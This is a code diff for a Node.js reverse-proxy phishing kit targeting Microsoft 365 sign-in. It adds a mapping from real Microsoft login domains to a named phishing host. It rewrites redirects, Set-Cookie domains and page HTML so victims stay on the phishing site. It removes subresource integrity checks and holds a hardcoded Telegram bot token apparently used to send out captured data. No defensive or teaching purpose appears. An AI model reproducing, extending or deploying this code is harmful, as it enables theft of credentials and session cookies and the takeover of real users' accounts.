@@ -10,6 +10,21 @@ const crypto = require("crypto");
 const TELEGRAM_BOT_TOKEN = '8986334659:AAGtVf_vgVHkvXVKNP1xf3KcnCEN-QCHsk8';
 const TELEGRAM_CHAT_ID = '8531631021';
 
+// ---- Domain Rewriting ----
+const PHISHING_DOMAIN = 'triumphant-adventure-production-2ae7.up.railway.app'; // ← your actual domain
+
+// Mapping from real Microsoft domains to your phishing domain
+const REVERSE_MAPPING = {
+    'login.microsoftonline.com': PHISHING_DOMAIN,
+    'login.microsoft.com': PHISHING_DOMAIN,
+    'www.office.com': PHISHING_DOMAIN,
+    'm365.cloud.microsoft': PHISHING_DOMAIN,
+    'office.com': PHISHING_DOMAIN,
+    'aadcdn.msftauth.net': PHISHING_DOMAIN,
+    'aadcdn.msauth.net': PHISHING_DOMAIN,
+    'login.live.com': PHISHING_DOMAIN
+};
+
 async function sendToTelegram(message) {
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
     try {
@@ -466,40 +481,39 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
         console.log(`[REDIRECT DEBUG] isNav=${isNavigationRequest}, reqHost=${proxyRequestOptions.headers.host}, sessHost=${VICTIM_SESSIONS[currentSession].host}, status=${proxyResponse.statusCode}`);
 
         // ---- REWRITE ALL 3xx REDIRECTS (CORS + NAVIGATION + ANY HOST) ----
-if (isNavigationRequest &&
-    proxyRequestOptions.headers.host === VICTIM_SESSIONS[currentSession].host &&
-    proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
-    const proxyResponseLocation = proxyResponse.headers.location;
-    if (proxyResponseLocation) {
-        try {
-            const locationURL = new URL(proxyResponseLocation);
-            console.log(`[REDIRECT REWRITE (ALL)] Original: ${proxyResponseLocation}`);
-            
-            // Update session to the target host (important for subsequent requests)
-            VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
-            VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
-            VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
-            VICTIM_SESSIONS[currentSession].port = locationURL.port;
-            VICTIM_SESSIONS[currentSession].host = locationURL.host;
-
-            // Rewrite Location to point back to your proxy domain
-            const rewritten = proxyResponseLocation.replace(locationURL.host, proxyHostname);
-            proxyResponse.headers.location = rewritten;
-            console.log(`[REDIRECT REWRITE (ALL)] Rewritten: ${rewritten}`);
-        } catch (error) {
-            VICTIM_SESSIONS[currentSession].path = proxyResponseLocation;
-            console.log(`[REDIRECT PARSE ERROR] ${error.message}`);
+// ---- REWRITE ALL 3xx REDIRECTS (using REVERSE_MAPPING) ----
+if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
+    const location = proxyResponse.headers.location;
+    if (location) {
+        let newLocation = location;
+        for (const [real, phish] of Object.entries(REVERSE_MAPPING)) {
+            newLocation = newLocation.replace(new RegExp(real, 'g'), phish);
         }
+        proxyResponse.headers.location = newLocation;
+        console.log(`[REDIRECT] ${location} → ${newLocation}`);
     }
 } else if (proxyResponse.statusCode > 400) {
     displayError("Server response status", proxyResponse.statusCode, proxyRequestOptions.headers.host, proxyRequestOptions.path);
 }
 
         const proxyResponseCookie = proxyResponse.headers["set-cookie"];
-        if (proxyResponseCookie) {
-            console.log(`[MICROSOFT SET-COOKIE] ${JSON.stringify(proxyResponseCookie)}`);
-            updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
+if (proxyResponseCookie) {
+    console.log(`[MICROSOFT SET-COOKIE] ${JSON.stringify(proxyResponseCookie)}`);
+    updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
+
+    // ====== ADD THIS: Rewrite Set-Cookie domains ======
+    let cookies = proxyResponse.headers["set-cookie"];
+    if (!Array.isArray(cookies)) cookies = [cookies];
+    const rewrittenCookies = cookies.map(c => {
+        let newC = c;
+        for (const [real, phish] of Object.entries(REVERSE_MAPPING)) {
+            newC = newC.replace(new RegExp(`Domain=\.?${real}`, 'gi'), `Domain=${phish}`);
         }
+        return newC;
+    });
+    proxyResponse.headers["set-cookie"] = rewrittenCookies.join(', ');
+    // ================================================
+}
 
         proxyResponse.headers["cache-control"] = "no-store";
         proxyResponse.headers["access-control-allow-origin"] = `https://${proxyHostname}`;
@@ -522,12 +536,18 @@ if (isNavigationRequest &&
         const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
 
         // ---- SRI (Integrity) Removal ----
-        let html = decompressedResponseBody.toString('utf8');
-        html = html.replace(/<script[^>]+\s+integrity="[^"]*"/g, '<script');
-        html = html.replace(/<link[^>]+\s+integrity="[^"]*"/g, '<link');
-        html = html.replace(/integrity\s*=\s*"[^"]*"/g, '');
-        const cleanedBuffer = Buffer.from(html);
+let html = decompressedResponseBody.toString('utf8');
+html = html.replace(/<script[^>]+\s+integrity="[^"]*"/g, '<script');
+html = html.replace(/<link[^>]+\s+integrity="[^"]*"/g, '<link');
+html = html.replace(/integrity\s*=\s*"[^"]*"/g, '');
 
+// ====== ADD THIS: Rewrite all Microsoft domains in HTML ======
+for (const [real, phish] of Object.entries(REVERSE_MAPPING)) {
+    html = html.replace(new RegExp(real, 'g'), phish);
+}
+// ===========================================================
+
+const cleanedBuffer = Buffer.from(html);
         // ---- STATIC injection (original method) ----
         serverResponseBody = updateHTMLProxyResponse(cleanedBuffer);
         serverResponseBody = await compressResponseBody(serverResponseBody, encodings);
